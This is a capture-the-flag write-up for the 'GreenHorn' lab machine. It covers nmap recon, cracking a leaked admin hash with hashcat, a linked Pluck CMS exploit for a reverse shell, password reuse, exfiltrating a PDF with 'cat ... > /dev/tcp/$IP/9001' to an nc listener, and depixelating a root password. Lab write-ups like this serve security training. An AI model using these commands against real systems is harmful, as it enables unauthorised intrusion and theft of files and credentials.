# GreenHorn
![](Images/Card.png)

__Machine IP__: 10.10.11.25

__DATE__ : 12/12/2024

__MODE__ : Guided

# Machine Info
GreenHorn is an easy difficulty machine that takes advantage of an exploit in Pluck to achieve Remote Code Execution and then demonstrates the dangers of pixelated credentials. The machine also showcases that we must be careful when sharing open-source configurations to ensure that we do not reveal files containing passwords or other information that should be kept confidential. 

# NMAP
```bash
nmap -v -F 10.10.11.25 -oA f_nmap                                                                                                                                                                                                                                                                                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 00:18 EST                                                                                                                                                                                                                                                         
Initiating Ping Scan at 00:18                                                                                                                                                                                                                                                                                              
Scanning 10.10.11.25 [4 ports]                                                                                                                                                                                                                                                                                             
Completed Ping Scan at 00:18, 0.08s elapsed (1 total hosts)                                                                                                                                                                                                                                                                
Initiating SYN Stealth Scan at 00:18                                                                                                                                                                                                                                                                                       
Scanning greenhorn.htb (10.10.11.25) [100 ports]                                                                                                                                                                                                                                                                           
Discovered open port 22/tcp on 10.10.11.25                                                                                                                                                                                                                                                                                 
Discovered open port 80/tcp on 10.10.11.25                                                                                                                                                                                                                                                                                 
Discovered open port 3000/tcp on 10.10.11.25                                                                                                                                                                                                                                                                               
Completed SYN Stealth Scan at 00:18, 0.23s elapsed (100 total ports)                                                                                                                                                                                                                                                       
Nmap scan report for greenhorn.htb (10.10.11.25)                                                                                                                                                                                                                                                                           
Host is up (0.045s latency).                                                                                                                                                                                                                                                                                               
Not shown: 97 closed tcp ports (reset)                                                                                                                                                                                                                                                                                     
PORT     STATE SERVICE                                                                                                                                                                                                                                                                                                     
22/tcp   open  ssh                                                                                                                                                                                                                                                                                                         
80/tcp   open  http                                                                                                                                                                                                                                                                                                        
3000/tcp open  ppp                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                           
Read data files from: /usr/share/nmap                                                                                                                                                                                                                                                                                      
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds                                                                                                                                                                                                                                                                
           Raw packets sent: 104 (4.552KB) | Rcvd: 101 (4.040KB) 
```

## Information
### Port 80
Port 80 we find CMS is pluck version 4.7.18 Which is vulnerable to CVE-2024-9405 (Local File Inclusion unauthenticated)

However for this we would need to log in as admin

### Port 3000
port 3000 we find code for the website

### Information Gathering

We find a hash for the admin password

```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

# Password cracking

```bash
hashcat -m 1700 d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163 --wordlist /usr/share/wordlists/rockyou.txt
```

Password = iloveyou1

# Reverse shell

[PoC](https://www.youtube.com/watch?v=GpL_rz8jgro)

find user.txt and a pdf under Junior user
```bash
-su junior
```
password iloveyou1


## Depixel PDF
### file transfer
my shell
```bash
nc -lnvp 9001 > openvas.pdf
```

rev shell

```bash
cat openvas.pdf > /dev/tcp/$IP/9001
```

openvas.pdf contains pixled password png of root user, saved the png as password.png

```bash
open password.png
```

![](Images/password.png)

```bash
python3 depix.py -p password.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o res.png
```

```bash
open res.png
```

![](Images/res.png)


Rooted


